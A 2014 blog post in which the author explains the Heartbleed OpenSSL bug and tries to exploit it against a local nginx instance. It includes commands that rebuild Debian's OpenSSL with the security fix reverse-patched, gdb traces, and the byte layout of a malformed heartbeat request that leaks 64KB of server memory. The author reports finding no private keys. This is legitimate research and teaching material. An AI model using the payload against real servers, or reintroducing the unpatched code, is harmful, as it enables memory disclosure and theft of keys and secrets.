---
layout: post
title:  "Exploiting Heartbleed bug"
date:   2014-08-23 13:31:48
categories: jekyll update
published: yes
pygments: true
summary: "In this post I will sum up all the steps I have gone through to implement a 
Hearbleed POC. The aim was to try to exploit the well known bug to
steal the private keys from my local instance using a vulnerable version of OpenSSL.
Unfortunately the outcome was not the one I was hoping for, but this has 
proven to be a very interesting experiment anyway."
---


The bug
=======

Hearbleed, CVE-2014-0160 in the Common Vulnerabilities and Exposures system, 
is a bug which affects OpenSSL library and allows an attacker to retrieve a 64KB 
chunk of memory from the address space of the
process which is using the library. The bug resides in the implementation of one
of the features of the TLS protocol, the TLS Hearbeat Extension, and affects
OpenSSL from version 1.0.1 to 1.0.1f included.

The programming error lies in *ssl/t1_lib.c* in function tls1\_process\_heartbeat 
A hearbeat request is a way to check if the remote end of the connection is still
alive. The client sends a request  with a payload and the server is supposed 
to reply with the same payload.


{% highlight C linenos %}
/* Allocate memory for the response, size is 1 bytes
 * message type, plus 2 bytes payload length, plus
 * payload, plus padding
 */
buffer = OPENSSL_malloc(1 + 2 + payload + padding);
bp = buffer;

/* Enter response type, length and copy payload */
*bp++ = TLS1_HB_RESPONSE;
s2n(payload, bp);
 memcpy(bp, pl, payload);
bp += payload;

/* Random padding */
RAND_pseudo_bytes(bp, padding);

{% endhighlight %}

*payload* is the length of the payload of the heartbeat request sent from the client. This
value is read from the heartbeat message itself. *pl* is a pointer to the buffer containing 
the payload sent by the client. What causes the bug is that
the payload length advertised by the client is never checked against the actual
length of the buffer received. A client might specify a length of N bytes, but
send instead only M bytes, with M < N. When sending back the response,
the server copies *payload* bytes from the buffer pointed by *pl*, which has been
allocated by the server to store the heartbeat request. So in principle a client can
send a heartbeat message with an arbitrary length value, and it will get back a chunk of memory
from the server address space. The *payload* field is actually 16 bits long,
so the maximum length is 64KB. The bug can be easily fixed by checking that the advertised
length of the payload matches the actual length. A <a href="http://git.openssl.org/gitweb/?p=openssl.git;a=commit;h=731f431497f463f3a2a97236fe0187b11c44aead" target="_blank">patch</a> 
was released soon after the disclosure of the bug.


Those 64KB leaked by the server could contain everything which lives in the process address space. 
Of course the worst case scenario is a server leaking a chunk of memory which
contains the private keys used for the SSL connection. Soon after the bug went
public, Cloudflare announced the Heartbleed Challange, asking the community to
steal the private keys from a nginx instance running on their servers. According
to their very early experiments, they thought <a href="https://blog.cloudflare.com/answering-the-critical-question-can-you-get-private-ssl-keys-using-heartbleed/" target="_blank">
this would not happen</a>, 
but it turned out they were wrong. In fact, at least four people were able to steal 
the private keys exploiting the heartbleed bug, Fedor Indutny being the first one.



openssl package
===============

My idea was to try to steal the private keys from my own instance. I am
running Debian Wheezy 7.1 and, according to apt, the openssl version I have
installed on my machine is *1.0.1e*.

{% highlight console lineos %}
➜  ~ [1] at 15:48:42 [Sun 1] $ sudo apt-cache policy openssl    
openssl:
  Installed: 1.0.1e-2+deb7u14
  Candidate: 1.0.1e-2+deb7u14
  Version table:
 *** 1.0.1e-2+deb7u14 0
        500 http://security.debian.org/ wheezy/updates/main i386 Packages
        100 /var/lib/dpkg/status
     1.0.1e-2+deb7u13 0
        500 http://ftp.ch.debian.org/debian/ wheezy/main i386 Packages

{% endhighlight %}

At a first glance, this might seem a vulnerable release, but the output
of openssl version shows that the package has been compiled in early 2015.

{% highlight console lineos %} 
➜  ~ [1] at 15:48:51 [Sun 1] $ openssl version -a              
OpenSSL 1.0.1e 11 Feb 2013
built on: Thu Jan  8 21:47:50 UTC 2015
platform: debian-i386-i686/cmov
options:  bn(64,32) rc4(8x,mmx) des(ptr,risc1,16,long) blowfish(idx) 
[...]
{% endhighlight %}

The changelog for *openssl_1.0.1e-2+deb7u14* is available 
<a href="http://metadata.ftp-master.debian.org/changelogs/main/o/openssl/openssl_1.0.1e-2+deb7u14_changelog" target="_blank">here</a>.
On April the 7th, heartbleed bug was fixed and a patch was applied to the package
incrementing the release to deb7u5.

{% highlight console lineos %} 

openssl (1.0.1e-2+deb7u5) wheezy-security; urgency=high

  * Non-maintainer upload by the Security Team.
  * Add CVE-2014-0160.patch patch.
    CVE-2014-0160: Fix TLS/DTLS hearbeat information disclosure.
    A missing bounds check in the handling of the TLS heartbeat extension
    can be used to reveal up to 64k of memory to a connected client or
    server.

 -- Salvatore Bonaccorso <carnil@debian.org>  Mon, 07 Apr 2014 22:26:55 +0200
{% endhighlight %} 

The openssl version installed on my machine is therefore not vulnerable. In order to
restore the bug, the package must be rebuilt avoiding the application of
the patch. When the source deb file is downloaded, the patches are applied automatically.
The easiest way to build a vulnerable package it to apply a reverse patch. The 
following commands can be used.


{% highlight console lineos %}
apt-get source openssl
cd openssl-1.0.1e/debian/patches/
interdiff CVE-2014-0160.patch /dev/null > hb_reversed.patch
mv hb_reversed.patch ../../
cd ../..
patch -p1 < hb_reversed.patch
{% endhighlight %}

The patch should apply successfully. The changes must be committed with dpkg-source 
--commit (it is not possible to compile the new package until then). This will
create the "official" patch out of the differences in the codebase. When committing,
a description of the fix must be entered: this will be appended on 
top of the .patch file. In order to modify the changelog, dch can be used, which is part
of devscripts in Debian.

*dch -i*  opens an editor where a new entry in the changelog can be added. 
The version which appears in the changelog will be the one displayed
by apt. For instance, in my case I incremented my version to *1.0.1e-2+deb7u14.1*.
The package can be build with  *dpkg-buildpackage -us -uc*.

Once finished, *openssl\_1.0.1e-2+deb7u14.1\_i386.deb* and related packages will be
available. Heartbleed vulnerability comes from libssl1.0.0 and the package 
that should be installed is *libssl1.0.0\_1.0.1e-2+deb7u14.1\_i386.deb*.


 {% highlight console lineos %}
➜  /tmp [1] at 16:32:06 [Sat 7] $ sudo dpkg -i libssl1.0.0_1.0.1e-2+deb7u14.1_i386.deb
(Reading database ... 203151 files and directories currently installed.)
Preparing to replace libssl1.0.0:i386 1.0.1e-2+deb7u14.1 (using libssl1.0.0_1.0.1e-2+deb7u14.1_i386.deb) ...
Unpacking replacement libssl1.0.0:i386 ...
Setting up libssl1.0.0:i386 (1.0.1e-2+deb7u14.1) ...


➜  /tmp [1] at 16:33:31 [Sat 7] $ sudo apt-cache policy libssl1.0.0
libssl1.0.0:
  Installed: 1.0.1e-2+deb7u14.1
  Candidate: 1.0.1e-2+deb7u14.1
  Version table:
 *** 1.0.1e-2+deb7u14.1 0
        100 /var/lib/dpkg/status
     1.0.1e-2+deb7u14 0
        500 http://security.debian.org/ wheezy/updates/main i386 Packages
     1.0.1e-2+deb7u13 0
        500 http://ftp.ch.debian.org/debian/ wheezy/main i386 Packages
{% endhighlight %}

It is possible to revert to the old clean package by defining a
specific version on the command line.

{% highlight console lineos %} 
➜  /tmp [1] at 16:38:25 [Sat 7] $ sudo apt-get install libssl1.0.0=1.0.1e-2+deb7u14
Reading package lists... Done
Building dependency tree       
Reading state information... Done
The following packages will be DOWNGRADED:
  libssl1.0.0
0 upgraded, 0 newly installed, 1 downgraded, 0 to remove and 269 not upgraded.
Need to get 0 B/3,037 kB of archives.
After this operation, 52.2 kB disk space will be freed.
Do you want to continue [Y/n]? Y
Preconfiguring packages ...
dpkg: warning: downgrading libssl1.0.0:i386 from 1.0.1e-2+deb7u14.1 to 1.0.1e-2+deb7u14
(Reading database ... 203151 files and directories currently installed.)
Preparing to replace libssl1.0.0:i386 1.0.1e-2+deb7u14.1 (using .../libssl1.0.0_1.0.1e-2+deb7u14_i386.deb) ...
Unpacking replacement libssl1.0.0:i386 ...
Setting up libssl1.0.0:i386 (1.0.1e-2+deb7u14) ...

{% endhighlight %}


nginx installation
==================
nginx can be configured to enable HTTPS connections by simply adding this entry
in the configuration file, */etc/nginx/nginx.conf* by default.


    server {
        listen              443 ssl;
        server_name         localhost;
        ssl_certificate     <path_to_ssl_cert>;
        ssl_certificate_key <path_to_private_key>;
        location / {
                root   /usr/share/nginx/www;
                index  index.html index.htm;
        }
    }


Heartbeat request
=================
The very first step is to try to send a proper hearbeat request to the nginx
instance.

    0x18                    # Type: Heartbeat
    0x03 0x02               # Protocol: TLS 1.1 (SSL v3.2) 
    0x00 0x17               # Record length, size of the heartbeat message
    0x01                    # hearbeat message type: request
    0x00 0x04               # Payload size
    0xDE 0xAD 0xBE 0xEF     # Payload
    0xAB 0x9A 0xC1 0x97     # 16 bytes random padding
    0xDA 0xC8 0xFC 0x92     # 
    0x9E 0xEE 0xD4 0x3B     #
    0x93 0xDD 0x7D 0xB5     #

It turned out to be a bit more complicated than that. The heartbeat message is sent
to the server but no response whatsoever is returned. The following picture shows
that Wireshark decodes properly the SSL record, which means that the message can
be considered as well-formatted.

<p align="center">
<a id="single_image" href="/img/hb_good_request_detail.png"><img  src="/img/hb_good_request_detail.png" alt=""/></a>
</p>

Even if the SSL handshake is not terminated, as shown by the traffic captured with Wireshark, 
the server should reply anyway with a heartbeat response message. After several 
unsuccessful attempts, I decided to go more in depth by following step by 
step the execution on the server side.

<p align="center"> 
<a id="single_image" href="/img/hb_good_request.png"><img src="/img/hb_good_request.png" alt=""/></a>
</p>


Executing libssl under gdb
=========================

In order to execute libssl code step by step, the sources must be compiled with
debug symbols and without optimization. Step by step execution of optimized code is very tricky, as
it's difficult to map the assembly code to the original source due to optimizations 
like instruction reordering, loop unrolling, inlining. The easiest way is to simply
turn off optimizations. CFLAGS used by dpkg can be set in */etc/dpkg/buildflags.conf*.
In this specific case, the following directive does the job.

    SET CFLAGS -g -O0 -fstack-protector --param=ssp-buffer-size=4 -Wformat -Werror=format-security  

After recompiling  libssl1.0.0, the debugging symbols should be embedded in the library,
therefore the debug package *libssl1.0.0-dbg\_1.0.1e-2+deb7u14.\_i386* should
not be necessary. A further simplification which makes the debugging easier is
to set

    worker_processes 1;

in */etc/nginx/nginx.conf*, so that there is just one thread serving the requests
coming from the clients. nginx must be stopped and restarted and gdb can
then be attached to the worker process.

    ➜  ~ [1] at 10:15:57 [Thu 12] $ ps aux | grep nginx
    root      5210  0.0  0.0  11980   960 ?        Ss   10:15   0:00 nginx: master process /usr/sbin/nginx
    www-data  5211  0.0  0.0  12144  1356 ?        S    10:15   0:00 nginx: worker process
    marco     5258  0.0  0.0   3548   804 pts/0    S+   10:15   0:00 grep nginx
    ➜  ~ [1] at 10:15:58 [Thu 12] $ sudo gdb           
    GNU gdb (GDB) 7.4.1-debian
    Copyright (C) 2012 Free Software Foundation, Inc.
    License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
    This is free software: you are free to change and redistribute it.
    There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
    and "show warranty" for details.
    This GDB was configured as "i486-linux-gnu".
    For bug reporting instructions, please see:
    <http://www.gnu.org/software/gdb/bugs/>.
    (gdb) attach 5211


gdb executes the ptrace system call and starts tracing nginx. It then tries to load the
symbols of all the shared objects mapped in the address space of the process, including
libssl.so.1.0.0. If gdb fails to load the symbols for libssl, then something went wrong.

    Reading symbols from /usr/lib/i386-linux-gnu/i686/cmov/libssl.so.1.0.0...done.
    Loaded symbols for /usr/lib/i386-linux-gnu/i686/cmov/libssl.so.1.0.0

gdb should also be pointed to the location of the source code with the *directory*
command.

    (gdb) directory <path-of-the-sources-of-the-dpkg-package>/openssl-1.0.1e/ssl
    Source directories searched: <path-of-the-sources-of-the-dpkg-package>/openssl-1.0.1e/ssl:$cdir:$cwd

A breakpoint on *tls1\_process\_heartbeat* can be set and the execution resumed.

    (gdb) break tls1_process_heartbeat
    Breakpoint 1 at 0xb76c29d4: file t1_lib.c, line 2579.
    (gdb) c
    Continuing.

Now, upon receiving a heartbeat message, the code will hit the breakpoint, allowing
step by step execution.


    Breakpoint 1, tls1_process_heartbeat (s=0x9910a58) at t1_lib.c:2579
    2579        unsigned char *p = &s->s3->rrec.data[0], *pl;
    (gdb) s
    2582        unsigned int padding = 16; /* Use minimum padding */
    (gdb) s
    2585        hbtype = *p++;
    (gdb) s
    2586        n2s(p, payload);
    (gdb) 
    2587        pl = p;
    (gdb)


The control path which explains why a heartbeat response is not returned
is not that trivial and without a proper knowledge of the
library it's difficult to fully grasp what the code does. After
a series of *step* and *next*, the single step execution led to the function
*buffer_write* in *bf_buff.c*. 

{% highlight console linenos %}
Breakpoint 1, tls1_process_heartbeat (s=0x9910a58) at t1_lib.c:2579
[...]
2614            r = ssl3_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, 3 + payload + padding);
(gdb) s
    ssl3_write_bytes (s=0x9910a58, type=24, buf_=0x99609a8, len=23) at s3_pkt.c:584
    [...]
    611         i=do_ssl3_write(s, type, &(buf[tot]), nw, 0);
    (gdb) s
        do_ssl3_write (s=0x9910a58, type=24, buf=0x99609a8 "\002", len=23, create_empty_fragment=0) at s3_pkt.c:638
        [...]
        856     return ssl3_write_pending(s,type,buf,len);
        (gdb) s
        ssl3_write_pending (s=0x9910a58, type=24, buf=0x99609a8 "\002", len=23) at s3_pkt.c:866
            [...]
            884             i=BIO_write(s->wbio,
            (gdb) s
                BIO_write (b=0x99128b0, in=0x995b8cb, inl=28) at bio_lib.c:227
                [...]    
                241     if (!b->init)
                (gdb) 
                247     i=b->method->bwrite(b,in,inl);
                (gdb) s
                    buffer_write (b=0x99128b0, in=0x995b8cb "\030\003\002", inl=28) at bf_buff.c:199
                    [...]
                    210     if (i >= inl)
                    (gdb) 
                    212         memcpy(&(ctx->obuf[ctx->obuf_off+ctx->obuf_len]),in,inl);
                    (gdb) 
                    213         ctx->obuf_len+=inl;
                    (gdb) 
                    214         return(num+inl);
                    (gdb) 
                    268     }
                    (gdb) 
                BIO_write (b=0x99128b0, in=0x995b8cb, inl=28) at bio_lib.c:249
                249     if (i > 0) b->num_write+=(unsigned long)i;
{% endhighlight %}

A full trace is available <a href="/includes/hb_trace.txt" target="_blank">here</a>.
The *buffer_write* function is defined in *crypto/bio/bf_buf.c* as follows.

{% highlight C linenos %}
static int buffer_write(BIO *b, const char *in, int inl)
        {
        int i,num=0;
        BIO_F_BUFFER_CTX *ctx;

        if ((in == NULL) || (inl <= 0)) return(0);
        ctx=(BIO_F_BUFFER_CTX *)b->ptr;
        if ((ctx == NULL) || (b->next_bio == NULL)) return(0);

        BIO_clear_retry_flags(b);
start:
        i=ctx->obuf_size-(ctx->obuf_len+ctx->obuf_off);
        /* add to buffer and return */
        if (i >= inl)
                {
                memcpy(&(ctx->obuf[ctx->obuf_off+ctx->obuf_len]),in,inl);
                ctx->obuf_len+=inl;
                return(num+inl);
                }
        /* else */
        /* stuff already in buffer, so add to it first, then flush */
        if (ctx->obuf_len != 0)
                {
                if (i > 0) /* lets fill it up if we can */
                        {
                        memcpy(&(ctx->obuf[ctx->obuf_off+ctx->obuf_len]),in,i);
                        in+=i;
                        inl-=i;
                        num+=i;
                        ctx->obuf_len+=i;
                        }
                /* we now have a full buffer needing flushing */
                for (;;)
                        {
                        i=BIO_write(b->next_bio,&(ctx->obuf[ctx->obuf_off]),
                                ctx->obuf_len);
                        if (i <= 0)
                                {
                                BIO_copy_next_retry(b);

                                if (i < 0) return((num > 0)?num:i);
                                if (i == 0) return(num);
                                }
                        ctx->obuf_off+=i;
                        ctx->obuf_len-=i;
                        if (ctx->obuf_len == 0) break;
                        }
                }
        /* we only get here if the buffer has been flushed and we
         * still have stuff to write */
        ctx->obuf_off=0;

        /* we now have inl bytes to write */
        while (inl >= ctx->obuf_size)
                {
                i=BIO_write(b->next_bio,in,inl);
                if (i <= 0)
                        {
                        BIO_copy_next_retry(b);
                        if (i < 0) return((num > 0)?num:i);
                        if (i == 0) return(num);
                        }
                num+=i;
                in+=i;
                inl-=i;
                if (inl == 0) return(num);
                }

        /* copy the rest into the buffer since we have only a small 
         * amount left */
        goto start;
        }
{% endhighlight %}

This function writes the data passed as argument with pointer *\*in* into
the buffer pointed by the BIO object *\*b*. The decision whether to flush or not
the buffer through the socket is taken based on the size of the data with respect to 
the size of the BIO buffer. If the former is smaller than the latter, the buffer is
not flushed (line 14). The heartbeat response message here is 28 bytes and the buffer is 4KB,
the data is written on the buffer but not flushed.

    (gdb) print i
    $1 = 4096
    (gdb) print inl
    $2 = 28

What happens if the size of the heartbeat message is bigger than the buffer, say 5000
bytes? I used <a href="https://github.com/marcoguerri/heartbleed/blob/master/send_heartbeat.c" target="_blank"> heartbeat\_send.c</a> 
to send a well-formed heartbeat request while tracing *buffer_write*.

    (gdb) 
    247     i=b->method->bwrite(b,in,inl);
    (gdb) s
    buffer_write (b=0x9960ae8, in=0x995b8cb "[content of the buffer, omitted]"..., inl=5000) at bf_buff.c:199
    199     int i,num=0;
    (gdb) print inl
    $3 = 5000
    (gdb) n
    202     if ((in == NULL) || (inl <= 0)) return(0);
    (gdb) 
    203     ctx=(BIO_F_BUFFER_CTX *)b->ptr;
    (gdb) 
    204     if ((ctx == NULL) || (b->next_bio == NULL)) return(0);
    (gdb) 
    206     BIO_clear_retry_flags(b);
    (gdb) 
    208     i=ctx->obuf_size-(ctx->obuf_len+ctx->obuf_off);
    (gdb) 
    210     if (i >= inl)
    (gdb) 
    218     if (ctx->obuf_len != 0)
    (gdb) 
    247     ctx->obuf_off=0;
    (gdb) print ctx->obuf_len
    $4 = 0
    (gdb) n
    250     while (inl >= ctx->obuf_size)
    (gdb) 
    252         i=BIO_write(b->next_bio,in,inl);
    (gdb) 
    253         if (i <= 0)
    (gdb) 
    259         num+=i;
    (gdb) 
    260         in+=i;
    (gdb) 
    261         inl-=i;
    (gdb) 
    262         if (inl == 0) return(num);
    (gdb) 
    268     }
    (gdb) 
    BIO_write (b=0x9960ae8, in=0x995b8cb, inl=5000) at bio_lib.c:249
    249     if (i > 0) b->num_write+=(unsigned long)i;
    (gdb) print i
    $5 = 5000
 

The loop at line 54 writes 5000 bytes in the output buffer, which is then flushed through 
the socket; the client receives a well-formed heartbeat response with a payload
which matches the one carried in the request message.

<p align="center"> 
<a id="single_image" href="/img/hb_working_response.png"><img src="/img/hb_working_response.png" alt=""/></a>
</p>


Heartbleed request
=========================

A malformed hearbeat request features a payload size which does not match the actual
lenght of the data carried inside the message.

    0x18                    # Type: Heartbeat
    0x03 0x02               # Protocol: TLS 1.1 (SSL v3.2) 
    0x00 0x03               # Record length, size of the heartbeat message
    0x01                    # heartbeat message type: request
    0xFF 0xFF               # Payload size, does not match the actual size of the payload
                            # No payload

Due to the lack of checks on the payload size, the server returns 65536 bytes 
copied from the address space of the process: <a href="https://github.com/marcoguerri/heartbleed/blob/master/send_heartbeat.c" target="_blank"> heartbeat\_send.c</a>
can be adapted to send a malformed request. The heartbeat response message contains 65536 bytes 
of payload, 16 bytes of padding and 4 bytes of header, 65556 in total.

    ➜  ~/heartbleed [1] at 12:35:56 [Thu 12] $ ./send_heartbleed
    Initializing new connection...
    Connecting...
    Connected!
    resplen:  65556


Scanning leaked memory
=============================

After setting up my local nginx instance with a newly generated private/public
key pair, I tried to look for a prime factor that could divide *n* (part of the 
public key) in the memory leaked by the server. I used <a href="https://github.com/marcoguerri/heartbleed/blob/master/exploit.c" target="_blank">
exploit.c</a> to exploit the bug. 



With *ulimit*, I capped the maximum size of the virtual address space of the process 
at 256MB and I fired up 8 parallel instances of the script. After ~3M requests, 
I could not find any trace of the private keys.



[jekyll-gh]: https://github.com/mojombo/jekyll
[jekyll]:    http://jekyllrb.com
